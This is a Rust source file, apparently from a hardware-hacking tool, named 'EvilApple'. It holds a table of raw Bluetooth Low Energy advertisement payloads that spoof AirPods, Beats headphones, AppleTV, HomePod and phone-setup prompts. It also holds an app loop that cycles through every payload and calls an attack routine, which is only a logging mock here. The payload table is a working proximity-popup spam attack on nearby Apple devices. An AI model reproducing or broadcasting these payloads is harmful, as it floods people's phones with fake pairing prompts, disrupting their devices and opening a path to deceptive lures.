use log::info;

pub const DEVICES: &[(&str, &[u8])] = &[
    (
        "Airpods",
        &[
            0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00,
            0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00,
        ],
    ),
    (
        "Airpods Pro",
        &[
            0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00,
            0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00,
        ],
    ),
    (
        "Airpods Max",
        &[
            0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00,
            0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00,
        ],
    ),
    (
        "Airpods Gen 2",
        &[
            0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00,
            0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00,
        ],
    ),
    (
        "Airpods Gen 3",
        &[
            0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00,
            0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00,
        ],
    ),
    (
        "Airpods Pro Gen 2",
        &[
            0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00,
            0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00,
        ],
    ),
    (
        "Power Beats",
        &[
            0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00,
            0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00,
        ],
    ),
    (
        "Power Beats Pro",
        &[
            0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00,
            0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00,
        ],
    ),
    (
        "Beats Solo Pro",
        &[
            0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00,
            0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00,
        ],
    ),
    (
        "Beats Studio Buds",
        &[
            0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00,
            0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00,
        ],
    ),
    (
        "Beats Flex",
        &[
            0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00,
            0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00,
        ],
    ),
    (
        "Beats X",
        &[
            0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00,
            0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00,
        ],
    ),
    (
        "Beats Solo 3",
        &[
            0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00,
            0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00,
        ],
    ),
    (
        "Beats Studio 3",
        &[
            0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00,
            0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00,
        ],
    ),
    (
        "Beats Studio Pro",
        &[
            0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00,
            0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00,
        ],
    ),
    (
        "Betas Fit Pro",
        &[
            0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00,
            0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00,
        ],
    ),
    (
        "Beats Studio Buds Plus",
        &[
            0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00,
            0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00,
        ],
    ),
    (
        "AppleTV Setup",
        &[
            0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01,
            0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
        ],
    ),
    (
        "AppleTV Pair",
        &[
            0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06,
            0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
        ],
    ),
    (
        "AppleTV New User",
        &[
            0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20,
            0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
        ],
    ),
    (
        "AppleTV AppleID Setup",
        &[
            0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x2b,
            0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
        ],
    ),
    (
        "AppleTV Wireless Audio Sync",
        &[
            0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0xc0,
            0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
        ],
    ),
    (
        "AppleTV Homekit Setup",
        &[
            0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0d,
            0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
        ],
    ),
    (
        "AppleTV Keyboard Setup",
        &[
            0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x13,
            0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
        ],
    ),
    (
        "AppleTV Connecting to Network",
        &[
            0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x27,
            0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
        ],
    ),
    (
        "Homepod Setup",
        &[
            0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b,
            0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
        ],
    ),
    (
        "Setup New Phone",
        &[
            0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09,
            0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
        ],
    ),
    (
        "Transfer Number",
        &[
            0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x02,
            0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
        ],
    ),
    (
        "TV Color Balance",
        &[
            0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e,
            0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
        ],
    ),
];

pub trait EvilApple {
    fn attack_once(&self, data: &[u8]);
}

pub struct MockEvilApple;

impl EvilApple for MockEvilApple {
    fn attack_once(&self, data: &[u8]) {
        info!("mock attack once");
    }
}

pub struct EvilAppleApp<EA>
where
    EA: EvilApple,
{
    evil_apple: EA,
}

impl<EA> EvilAppleApp<EA>
where
    EA: EvilApple,
{
    pub fn new(evil_apple: EA) -> Self {
        Self { evil_apple }
    }

    pub fn enter(&self) {
        info!("enter evil apple app");
        for (name, data) in DEVICES {
            info!("attack device: {}", name);
            self.evil_apple.attack_once(data);
        }
    }
}